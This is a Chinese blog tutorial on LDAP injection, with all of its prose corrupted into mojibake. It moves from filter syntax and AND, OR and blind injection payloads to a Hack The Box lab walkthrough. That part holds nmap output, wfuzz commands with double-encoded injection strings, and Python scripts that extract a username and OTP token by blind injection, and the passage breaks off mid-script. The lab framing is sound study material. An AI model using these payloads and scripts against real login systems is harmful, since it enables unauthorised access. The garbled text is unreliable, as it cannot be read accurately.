<p>å¦ä¸€ä¸ªä¾‹å­æ˜¯ï¼šæ‚¨çŸ¥é“æŸä¸ªå¯¹è±¡çš„<code>givenName</code>å±æ€§çš„å¼€å¤´ä¸¤ä¸ªå­—æ¯æ˜¯â€œJoâ€ã€‚é‚£ä¹ˆï¼Œå¯ä»¥ä½¿ç”¨<code>(givenName=Jo*)</code>è¿›è¡ŒæŸ¥æ‰¾ï¼Œè¿™ä¼šè¿”å›<code>givenName</code>ä»¥<code>Jo</code>å¼€å¤´çš„æ‰€æœ‰å¯¹è±¡ã€‚</p>
<p>Over~~LDAPçš„è¯­æ³•æ˜¯ä¸æ˜¯å¾ˆç®€å•ã€‚</p>
<p>è¯´äº†è¿™ä¹ˆå¤šï¼Œå¯èƒ½å¾ˆå¤šå°ä¼™ä¼´è¿˜æ˜¯å¿ƒå­˜ç–‘é—®ï¼Œå·²ç»éƒ¨ç½²æˆåŠŸçš„LDAPåˆ°åº•æ˜¯é•¿ä»€ä¹ˆæ ·å­ï¼Ÿ</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡Google Hacking <code>intitle:â€phpLDAPadminâ€ inurl:cmd.php</code>æ¥æ£€ç´¢ä¸€ä¸‹ï¼ŒçœŸå®çš„è¿è¡Œçš„LDAPæœåŠ¡çš„ç½‘ç«™ï¼Œè¿™ä¸ªåœ°æ–¹æˆ‘å°±è´´ä¸€å¼ å›¾ç¤ºèŒƒä¸€ä¸‹ï¼ŒåŒ…å«äº†ä¸Šé¢æåˆ°çš„æ‰€æœ‰æ¦‚å¿µã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200721151807.png" alt=""></p>
<h2 id="0x02-LDAPæ³¨å…¥æ”»å‡»é¢">0x02 LDAPæ³¨å…¥æ”»å‡»é¢</h2>
<p>å…¶å®å®ƒçš„æ”»å‡»æ‰‹æ³•å’ŒSQLæ³¨å…¥çš„åŸç†éå¸¸ç›¸ä¼¼ï¼Œåœ¨æœ‰æ¼æ´çš„ç¯å¢ƒä¸­ï¼Œè¿™äº›æŸ¥è¯¢å‚æ•°æ²¡æœ‰å¾—åˆ°åˆé€‚çš„è¿‡æ»¤ï¼Œå› è€Œæ”»å‡»è€…å¯ä»¥æ³¨å…¥ä»»æ„æ¶æ„ä»£ç ã€‚ç”±äºæ¯”è¾ƒç®€å•ï¼Œæˆ‘è¿™é‡Œå°±èµ°é©¬è§‚èŠ±çš„æ–¹å¼æ¥è¿‡ä¸€éLDAPæ³¨å…¥çš„ä¸åŒç±»å‹ã€‚</p>
<blockquote>
<p>ä»¥ä¸‹éƒ¨åˆ†å†…å®¹æ‘˜è‡ªhttps://wooyun.js.org/drops/LDAP%E6%B3%A8%E5%85%A5%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%89%96%E6%9E%90.html</p>
</blockquote>
<h3 id="ANDæ³¨å…¥">ANDæ³¨å…¥</h3>
<p>è¿™ç§æƒ…å†µï¼Œåº”ç”¨ä¼šæ„é€ ç”±â€&amp;â€æ“ä½œç¬¦å’Œç”¨æˆ·å¼•å…¥çš„çš„å‚æ•°ç»„æˆçš„æ­£å¸¸æŸ¥è¯¢åœ¨LDAPç›®å½•ä¸­æœç´¢ï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&amp;(parameter1&#x3D;value1)(parameter2&#x3D;value2))</span><br></pre></td></tr></table></figure>
<p>è¿™é‡ŒValue1å’Œvalue2æ˜¯åœ¨LDAPç›®å½•ä¸­æœç´¢çš„å€¼ï¼Œæ”»å‡»è€…å¯ä»¥æ³¨å…¥ä»£ç ï¼Œç»´æŒæ­£ç¡®çš„è¿‡æ»¤å™¨ç»“æ„ä½†èƒ½ä½¿ç”¨æŸ¥è¯¢å®ç°ä»–è‡ªå·±çš„ç›®æ ‡ã€‚</p>
<p>æ¯”å¦‚è¯´ï¼Œä¸ºäº†éªŒè¯å®¢æˆ·ç«¯æä¾›çš„user/passwordå¯¹ï¼Œæ„é€ å¦‚ä¸‹LDAPè¿‡æ»¤å™¨å¹¶å‘é€ç»™LDAPæœåŠ¡å™¨ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&amp;(USER&#x3D;Uname)(PASSWORD&#x3D;Pwd)) </span><br></pre></td></tr></table></figure>
<p>å¦‚æœæ”»å‡»è€…è¾“å…¥ä¸€ä¸ªæœ‰æ•ˆåœ°ç”¨æˆ·åï¼Œå¦‚r00tgrokï¼Œç„¶åå†è¿™ä¸ªåå­—åé¢æ³¨å…¥æ°å½“çš„è¯­å¥ï¼Œpasswordæ£€æŸ¥å°±ä¼šè¢«ç»•è¿‡ã€‚</p>
<p>ä½¿å¾—Uname=slisberger)(&amp;))ï¼Œå¼•å…¥ä»»ä½•å­—ç¬¦ä¸²ä½œä¸ºPwdå€¼ï¼Œæ„é€ å¦‚ä¸‹æŸ¥è¯¢å¹¶å‘é€ç»™æœåŠ¡å™¨ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&amp;(USER&#x3D; slisberger)(&amp;)(PASSWORD&#x3D;Pwd))</span><br></pre></td></tr></table></figure>
<h3 id="ORæ³¨å…¥">ORæ³¨å…¥</h3>
<p>è¿™ç§æƒ…å†µï¼Œåº”ç”¨ä¼šæ„é€ ç”±â€|â€æ“ä½œç¬¦å’Œç”¨æˆ·å¼•å…¥çš„çš„å‚æ•°ç»„æˆçš„æ­£å¸¸æŸ¥è¯¢åœ¨LDAPç›®å½•ä¸­æœç´¢ï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(|(parameter1&#x3D;value1)(parameter2&#x3D;value2))</span><br></pre></td></tr></table></figure>
<p>è¿™é‡ŒValue1å’Œvalue2æ˜¯åœ¨LDAPç›®å½•ä¸­æœç´¢çš„å€¼ï¼Œæ”»å‡»è€…å¯ä»¥æ³¨å…¥ä»£ç ï¼Œç»´æŒæ­£ç¡®çš„è¿‡æ»¤å™¨ç»“æ„ä½†èƒ½ä½¿ç”¨æŸ¥è¯¢å®ç°ä»–è‡ªå·±çš„ç›®æ ‡ã€‚</p>
<p>ç±»ä¼¼çš„ï¼ŒåŠ å…¥ç°åœ¨ç”¨äºå±•ç¤ºå¯ç”¨èµ„æºçš„æŸ¥è¯¢ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(|(type&#x3D;Rsc1)(type&#x3D;Rsc2))</span><br></pre></td></tr></table></figure>
<p>Rsc1å’ŒRsc2è¡¨ç¤ºç³»ç»Ÿä¸­ä¸åŒç§ç±»çš„èµ„æºã€‚å¦‚æœæ”»å‡»è€…è¾“å…¥<code>Rsc=printer)(uid=*)</code>ï¼Œåˆ™ä¸‹é¢çš„æŸ¥è¯¢è¢«å‘é€ç»™æœåŠ¡å™¨ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(|(type&#x3D;printer)(uid&#x3D;*))(type&#x3D;scanner)</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·ä¹Ÿä¼šé€ æˆæ³¨å…¥çš„äº§ç”Ÿã€‚</p>
<h3 id="ç›²æ³¨">ç›²æ³¨</h3>
<p>SQLæ³¨å…¥ä¸­æœ‰ç›²æ³¨ï¼ŒLDAPä¸­ä¹Ÿå­˜åœ¨è¿™ç§é—®é¢˜ï¼ŒåŒ…æ‹¬ä¸‹é¢ä»‹ç»åˆ°çš„é¶æœºç”¨åˆ°çš„ä¹Ÿæ˜¯ç›²æ³¨çš„æ‰‹æ³•ã€‚</p>
<p>å‡è®¾æ”»å‡»è€…å¯ä»¥ä»æœåŠ¡å™¨å“åº”ä¸­æ¨æµ‹å‡ºä»€ä¹ˆï¼Œå°½ç®¡åº”ç”¨æ²¡æœ‰æŠ¥å‡ºé”™ä¿¡æ¯ï¼ŒLDAPè¿‡æ»¤å™¨ä¸­æ³¨å…¥çš„ä»£ç å´ç”Ÿæˆäº†æœ‰æ•ˆçš„å“åº”æˆ–é”™è¯¯ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€è¡Œä¸ºå‘æœåŠ¡å™¨é—®æ­£ç¡®çš„æˆ–é”™è¯¯çš„é—®é¢˜ã€‚</p>
<p>è¿˜æ˜¯ç”¨ä¸€ä¸ªä¾‹å­æ¥è¯´æ˜ã€‚</p>
<p>å‡è®¾ä¸€ä¸ªWebåº”ç”¨æƒ³ä»ä¸€ä¸ªLDAPç›®å½•åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„Epsonæ‰“å°æœºï¼Œé”™è¯¯ä¿¡æ¯ä¸ä¼šè¿”å›ï¼Œåº”ç”¨å‘é€å¦‚ä¸‹çš„è¿‡æ»¤å™¨ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&amp;(objectClass&#x3D;printer)(type&#x3D;Epson*))</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨è¿™ä¸ªæŸ¥è¯¢ï¼Œå¦‚æœæœ‰å¯ç”¨çš„Epsonæ‰“å°æœºï¼Œå…¶å›¾æ ‡å°±ä¼šæ˜¾ç¤ºç»™å®¢æˆ·ç«¯ï¼Œå¦åˆ™æ²¡æœ‰å›¾æ ‡å‡ºç°ã€‚å¦‚æœæ”»å‡»è€…è¿›è¡ŒLDAPç›²æ³¨å…¥æ”»å‡»</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*)(objectClass&#x3D;*))(&amp;(objectClass&#x3D;void</span><br></pre></td></tr></table></figure>
<p>Webåº”ç”¨ä¼šæ„é€ å¦‚ä¸‹æŸ¥è¯¢ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&amp;(objectClass&#x3D;*)(objectClass&#x3D;*))(&amp;(objectClass&#x3D;void)(type&#x3D;Epson*))</span><br></pre></td></tr></table></figure>
<p><strong>ä»…ç¬¬ä¸€ä¸ªLDAPè¿‡æ»¤å™¨ä¼šè¢«å¤„ç†</strong>ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&amp;(objectClass&#x3D;*)(objectClass&#x3D;*))</span><br></pre></td></tr></table></figure>
<p>é‚£ä¹ˆè¿™æ ·å°±å’Œæˆ‘ä»¬æŸ¥è¯¢çš„åˆè¡·ç›¸è¿èƒŒäº†ã€‚</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯è¿™ç¯‡æ–‡ç« çš„é‡å¤´æˆäº†ï¼Œæˆ‘ä»¬ä¸»è¦ä»è¿™ä¸ªé¶æœºä¸­å­¦åˆ°ä¸¤ç‚¹ï¼š</p>
<ul>
<li>æ€ä¹ˆå‘ç°LDAPæ³¨å…¥æ¼æ´</li>
<li>å¦‚ä½•åˆ©ç”¨LDAPæ³¨å…¥æ¼æ´</li>
</ul>
<h2 id="0x03-ä»HTBé¶æœºä¸­å­¦ä¹ LDAPæ³¨å…¥">0x03 ä»HTBé¶æœºä¸­å­¦ä¹ LDAPæ³¨å…¥</h2>
<h3 id="Initial-Enunciation">Initial Enunciation</h3>
<p>æ‹¿åˆ°é¶æœºå…ˆç”¨Nmapæ‰«ä¸€ä¸‹ç«¯å£</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Nmap 7.80 scan initiated Fri Jul 10 10:50:40 2020 as: nmap -sC -sV -oN ctf 10.10.10.122</span><br><span class="line">Nmap scan report for ctf.htb (10.10.10.122)</span><br><span class="line">Host is up (1.8s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 fd:ad:f7:cb:dc:42:1e:43:7d:b3:d5:8b:ce:63:b9:0e (RSA)</span><br><span class="line">|   256 3d:ef:34:5c:e5:17:5e:06:d7:a4:c8:86:ca:e2:df:fb (ECDSA)</span><br><span class="line">|_  256 4c:46:e2:16:8a:14:f6:f0:aa:39:6c:97:46:db:b4:40 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL&#x2F;1.0.2k-fips mod_fcgid&#x2F;2.3.9 PHP&#x2F;5.4.16)</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.6 (CentOS) OpenSSL&#x2F;1.0.2k-fips mod_fcgid&#x2F;2.3.9 PHP&#x2F;5.4.16</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line"># Nmap done at Fri Jul 10 11:03:44 2020 -- 1 IP address (1 host up) scanned in 783.74 seconds</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹80ç«¯å£</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710145257.png" alt=""></p>
<p>å¤§æ¦‚çš„æ„æ€å°±æ˜¯è®©æˆ‘ä»¬å°è¯•å»ç™»å½•è¿™ä¸ªç³»ç»Ÿï¼Œä½†æ˜¯ä¸èƒ½ç”¨SQLmapæˆ–è€…Dirbusterå»æš´åŠ›çŒœè§£ç”¨æˆ·åå’Œå¯†ç ã€‚</p>
<p>å†å»ç™»å½•ç•Œé¢çœ‹ä¸€ä¸‹ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710153946.png" alt=""></p>
<p>æç¤ºæˆ‘ä»¬æ˜¯ä¸€ä¸ªOTPï¼Œå³One Time Passwordï¼Œä¸€èˆ¬è€Œè¨€æ˜¯1åˆ†é’Ÿæ›´æ–°ä¸€æ¬¡ã€‚</p>
<p>æŸ¥çœ‹æºç ï¼Œå‘ç°æœ‰ä¸€ä¸ªHint</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710154051.png" alt=""></p>
<blockquote>
<p>å¦‚æœæ¯”è¾ƒç†Ÿæ‚‰LDAPçš„è¯ï¼Œè¿™é‡Œçš„ä¸¤ä¸ªåè¯schemaå’Œexisting attributeå·²ç»æç¤ºäº†æ˜¯å…³äºLDAPæ³¨å…¥ã€‚</p>
</blockquote>
<p>ä½œè€…ç”¨ä¸€ä¸ªå·²çŸ¥çš„å±æ€§å»å­˜å‚¨äº†81ä½çš„token stringï¼ŒGoogleæœä¸€ä¸‹<code>token string (81 digits)</code>ã€‚</p>
<blockquote>
<p><a href="https://www.systutorials.com/docs/linux/man/1-stoken/">https://www.systutorials.com/docs/linux/man/1-stoken/</a></p>
</blockquote>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710154249.png" style="zoom: 67%;" />
<p>å¯ä»¥çœ‹åˆ°ä¸€ä¸ªå…³é”®çš„åœ°æ–¹ï¼Œ<code>Pure numeric (81-digit) &quot;ctf&quot; (compressed token format) strings</code>ï¼Œå’Œé¶æœºçš„é¢˜ç›®ç›¸å¥‘åˆï¼Œç°åœ¨å°±æœ‰ä¸€ç‚¹æ€è·¯äº†ï¼Œåº”è¯¥è¦å»æ‰¾åˆ°è¿™ä¸ª81ä½çº¯æ•°å­—çš„tokenï¼Œç„¶åç”¨stokenå·¥å…·å»ç”ŸæˆOTPã€‚é‚£ä¹ˆä¸»è¦æ˜¯æ‰¾åˆ°tokenï¼Œå”¯ä¸€å¯ä»¥åˆ©ç”¨çš„å°±æ˜¯è¿™ä¸ªç™»å½•æ¡†äº†ã€‚</p>
<p>å…ˆéšä¾¿ç”¨æŸä¸ªç”¨æˆ·åå’Œå¯†ç ç™»å½•<code>admin:1234</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710164835.png" alt=""></p>
<p>è¿”å›<code>User admin not found</code>ï¼Œå†ç”¨SQLæ³¨å…¥çš„ä¸‡èƒ½å¯†ç è¯•ä¸€è¯•</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710164644.png" alt=""></p>
<p>ç›´æ¥æ˜¯æ²¡æœ‰ä»»ä½•æ˜¾ç¤ºï¼Œåº”è¯¥æ˜¯å¯¹ä¸€äº›ç‰¹æ®Šå­—ç¬¦æœ‰é»‘åå•è¿‡æ»¤ã€‚Fuzzä¸€ä¸‹è¿‡æ»¤äº†ä¸€äº›ä»€ä¹ˆå­—ç¬¦</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wfuzz -c --hw 233 -d &#39;inputUsername&#x3D;FUZZ&amp;inputOTP&#x3D;1234&#39; -w special-chars.txt 10.10.10.122&#x2F;login.php</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710165335.png" alt=""></p>
<blockquote>
<p>â€“hw 233 ä»£è¡¨è¿‡æ»¤æ‰å½¢å¦‚<code>User xxx not found</code>çš„è¿”å›ä¿¡æ¯ã€‚</p>
</blockquote>
<p>æˆ‘ä»¬å‘ç°<code>+</code>å’Œ<code>&amp;</code>è¿”å›çš„æ˜¯232 Wordsï¼Œä½†æ˜¯åœ¨é¡µé¢æµ‹è¯•ä¸€ä¸‹</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710173607.png" alt=""></p>
<p>å‘ç°è¿”å›çš„è¿˜æ˜¯<code>User + not found</code>æˆ–è€…<code>User &amp; not found</code>ï¼Œè¿™æ ·çš„è¯åº”è¯¥æ˜¯233 Wordsï¼Œè€Œä¸æ˜¯Wfuzzè¿”å›çš„232 Wordsã€‚</p>
<p>æˆ‘ä»¬å°è¯•æŠŠè¿™äº›ç‰¹æ®Šå­—ç¬¦äºŒæ¬¡URLç¼–ç ï¼Œçœ‹Webåº”ç”¨æ˜¯å¦è¿˜èƒ½è§£æï¼Œç”¨seclistsä¸­çš„doble_uri_hex.txtä½œä¸ºå­—å…¸</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wfuzz -c --hw 233 -d &#39;inputUsername&#x3D;FUZZ&amp;inputOTP&#x3D;1234&#39; -w doble-uri-hex.txt 10.10.10.122&#x2F;login.php</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710193655.png" alt=""></p>
<p>æœ€åFuzzå‡ºæ¥çš„è¢«è¿‡æ»¤çš„å­—ç¬¦å°±æ˜¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%2500 ---&gt; %00</span><br><span class="line">%2528 ---&gt; (</span><br><span class="line">%2529 ---&gt; )</span><br><span class="line">%252a ---&gt; *</span><br><span class="line">%255c ---&gt; \</span><br></pre></td></tr></table></figure>
<p>è¿™äº›è¢«è¿‡æ»¤çš„å­—ç¬¦å°±æ˜¯LDAPæ³¨å…¥éœ€è¦è¿‡æ»¤çš„æ‰€æœ‰å­—ç¬¦ï¼Œå†ç»“åˆ<code>login.php</code>é¡µé¢æºä»£ç ä¸­çš„hintï¼Œå¯ä»¥ç¡®å®šæ˜¯LDAPæ³¨å…¥ã€‚</p>
<h3 id="Getting-User-Access">Getting User Access</h3>
<p>å…ˆæ¥çœ‹LDAPæ³¨å…¥çš„æœ€åŸºæœ¬å½¢å¼</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&amp;</span><br><span class="line">	(password&#x3D;1234)</span><br><span class="line">	(uid&#x3D;ca01h%00)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>å…·ä½“åˆ°è¿™ä¸ªé¶æœºçš„è¯ï¼Œæˆ‘ä»¬éœ€è¦çŒœè§£æ‹¬å·çš„ä¸ªæ•°ã€‚è¿ç”¨ç±»ä¼¼ç›²æ³¨çš„æ€æƒ³ï¼Œå¦‚æœæ³¨å…¥æˆåŠŸï¼Œé‚£ä¹ˆå°±ä¼šè¿”å›<code>User ca01h not found</code>ã€‚</p>
<p>å‡è®¾åªæœ‰ä¸€ä¸ªæ‹¬å·ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710202659.png" alt=""></p>
<p>å‡è®¾æœ‰ä¸¤ä¸ªæ‹¬å·ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710202740.png" alt=""></p>
<p>å‡è®¾æœ‰ä¸‰ä¸ªæ‹¬å·ï¼š</p>
<p><img src="C:%5CUsers%5C51196%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200710202913036.png" alt="image-20200710202913036"></p>
<p>å½“å°è¯•åˆ°ä¸‰ä¸ªæ‹¬å·ç”¨äºé—­åˆæ—¶ï¼ŒæˆåŠŸè¿”å›äº†<code>User ca01h%29%29%29%00 not found</code>ï¼Œé‚£ä¹ˆè¿™ä¸ªç™»å½•æ¡†çš„LDAPæŸ¥è¯¢çš„åŸºæœ¬å½¢å¼å°±æ˜¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&amp;</span><br><span class="line">	(&amp;</span><br><span class="line">		(password&#x3D;1234)</span><br><span class="line">		(uid&#x3D;ca01h)))%00</span><br><span class="line">	)</span><br><span class="line">	(&amp;|</span><br><span class="line">		(other comparing)</span><br><span class="line">	)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>æ¥ç€ï¼Œæˆ‘ä»¬å†å›å¤´å»çœ‹ä¸€ä¸‹Fuzzå‡ºæ¥çš„è¢«è¿‡æ»¤çš„å­—ç¬¦ï¼Œå…¶ä¸­<code>%25%2a</code>è¿”å›çš„æ¶ˆæ¯é•¿åº¦ä¸º231 Words</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710203938.png" alt=""></p>
<p>å‘ç°å›æ˜¾çš„æ¶ˆæ¯æ˜¯<code>Cannot login</code>ï¼Œè¯´æ˜å¯ä»¥ç”¨<code>*</code>é€šé…ç¬¦æ¥ç›²æ³¨ç”¨æˆ·åï¼Œè„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">### username_burp.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_lowercase</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote_plus</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;http://10.10.10.122/login.php&#x27;</span></span><br><span class="line"></span><br><span class="line">username, done = <span class="string">&#x27;&#x27;</span>, <span class="literal">False</span></span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> done:</span><br><span class="line">	<span class="keyword">for</span> c <span class="keyword">in</span> ascii_lowercase:</span><br><span class="line">		payload = username + c + quote_plus(<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">		data = &#123;</span><br><span class="line">			<span class="string">&#x27;inputUsername&#x27;</span>: payload,</span><br><span class="line">			<span class="string">&#x27;inputOTP&#x27;</span>: <span class="string">&#x27;1234&#x27;</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		resp = requests.post(URL, data=data)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;Cannot login&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">			username += c</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        sys.stdout.write(<span class="string">f&#x27;\r<span class="subst">&#123;username&#125;</span><span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line">		time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        done = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">f&#x27;[+] Username: <span class="subst">&#123;username&#125;</span> \n&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710210916.png" alt=""></p>
<p>ç”¨æˆ·åä¸º<code>ldapuser</code></p>
<p>çŸ¥é“äº†ç”¨æˆ·åä¹‹åï¼Œæˆ‘ä»¬å°±è¦å»è·å–ç”ŸæˆOTPçš„81ä½tokenï¼Œé€šè¿‡é¡µé¢æºä»£ç çš„æç¤ºï¼Œè¿™ä¸ªtokenå­˜å‚¨åœ¨æŸä¸€ä¸ªLDAPé»˜è®¤å·²ç»å­˜åœ¨çš„å±æ€§å½“ä¸­ã€‚è€Œé»˜è®¤çš„å±æ€§å¯ä»¥åœ¨<a href="https://www.youtube.com/watch?v=51JQg202csw">PayloadsAllTheThings</a>ä¸­æ‰¾åˆ°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c</span><br><span class="line">cn</span><br><span class="line">co</span><br><span class="line">commonName</span><br><span class="line">dc</span><br><span class="line">facsimileTelephoneNumber</span><br><span class="line">givenName</span><br><span class="line">gn</span><br><span class="line">homePhone</span><br><span class="line">id</span><br><span class="line">jpegPhoto</span><br><span class="line">l</span><br><span class="line">mail</span><br><span class="line">mobile</span><br><span class="line">name</span><br><span class="line">o</span><br><span class="line">objectClass</span><br><span class="line">ou</span><br><span class="line">owner</span><br><span class="line">pager</span><br><span class="line">password</span><br><span class="line">sn</span><br><span class="line">st</span><br><span class="line">surname</span><br><span class="line">uid</span><br><span class="line">username</span><br><span class="line">userPassword</span><br></pre></td></tr></table></figure>
<p>å¦‚æœä¸æƒ³å†™è„šæœ¬çš„è¯ç”¨wfuzzæ¥Fuzzé¶æœºçš„LDAPä¸­å­˜åœ¨çš„å±æ€§å¯èƒ½ä¼šæ›´å¿«ä¸€äº›ï¼Œä½†è¿˜æ˜¯è¦å…ˆæ‰¾åˆ°æ³¨å…¥çš„å½¢å¼ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&amp;</span><br><span class="line">	(&amp;</span><br><span class="line">		(password&#x3D;1234)</span><br><span class="line">		(uid&#x3D;ldapuser)</span><br><span class="line">		(FUZZ&#x3D;*)</span><br><span class="line">	)</span><br><span class="line">	(&amp;|</span><br><span class="line">		(other comparing)</span><br><span class="line">	)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>æ­¤å¤–è¿˜è¦æŠŠæ³¨å…¥çš„å­—ç¬¦<code>ldapuser)(FUZZ=*</code>è¿›è¡ŒäºŒæ¬¡URLç¼–ç ï¼Œç¼–ç ä¹‹åçš„ç»“æœ<code>ldapuser%2529%2528FUZZ%253d%252a</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wfuzz -c --hw 233 -d &#39;inputUsername&#x3D;ldapuser%2529%2528FUZZ%253d%252a&amp;inputOTP&#x3D;1234&#39; -w LDAP_attributes.txt http:&#x2F;&#x2F;10.10.10.122&#x2F;login.php</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710213532.png" alt=""></p>
<p>æˆ‘ä»¬Fuzzå‡ºæ¥äº†è¿™ä¹ˆäº›å±æ€§æ˜¯å­˜åœ¨äºé¶æœºçš„LDAPæœåŠ¡ä¸­çš„ï¼Œç°åœ¨çš„å·¥ä½œå°±æ˜¯ä¸€ä¸ªä¸€ä¸ªçš„å±æ€§æ¥çŒœè§£ï¼Œå±äºä¸€äº›é‡å¤æ€§çš„å·¥ä½œï¼Œå°±ä¸åœ¨è¿™é‡Œè¿‡å¤šèµ˜è¿°äº†ï¼Œæœ€åå¯ä»¥æ‰¾åˆ°tokenæ˜¯å­˜å‚¨äºpagerå±æ€§ä¸­ã€‚æ¥ç€å†™è„šæœ¬ç”¨æ¥burp81ä½token</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># pager_burp.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits</span><br><span class="line"></span><br><span class="line">token = <span class="string">&quot;&quot;</span></span><br><span class="line">URL = <span class="string">&quot;http://10.10.10.122/login.php&quot;</span></span><br><span class="line">attribute = <span class="string">&quot;pager&quot;</span></span><br><span class="line">loop = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> loop &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">for</span> digit <span class="keyword">in</span> digits:</span><br><span class="line">        token = token</span><br><span class="line">        <span class="comment"># ldapuser)(pager=&lt;token&gt;)*</span></span><br><span class="line">        payload = <span class="string">f&quot;ldapuser%29%28<span class="subst">&#123;attribute&#125;</span>%3d<span class="subst">&#123;token&#125;</span><span class="subst">&#123;digit&#125;</span>%2a&quot;</span></span><br><span class="line">        data = &#123;<span class="string">&quot;inputUsername&quot;</span>: payload, <span class="string">&quot;inputOTP&quot;</span>: <span class="string">&quot;1234&quot;</span>&#125;</span><br><span class="line">        r = requests.post(URL, data=data)</span><br><span class="line">        sys.stdout.write(<span class="string">f&quot;\rToken: <span class="subst">&#123;token&#125;</span><span 